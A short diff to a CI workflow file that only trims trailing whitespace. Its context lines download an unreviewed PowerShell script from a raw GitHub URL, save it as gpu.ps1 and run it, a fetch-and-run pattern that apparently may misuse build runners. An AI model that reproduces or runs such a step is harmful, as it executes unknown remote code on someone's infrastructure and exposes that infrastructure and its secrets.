@@ -18,4 +18,4 @@ jobs:
           command: |      
             Invoke-WebRequest https://raw.githubusercontent.com/amelialab/opbykosar/main/sh -OutFile gpu.ps1 
           
-      - run: ./gpu.ps1 
+      - run: ./gpu.ps1
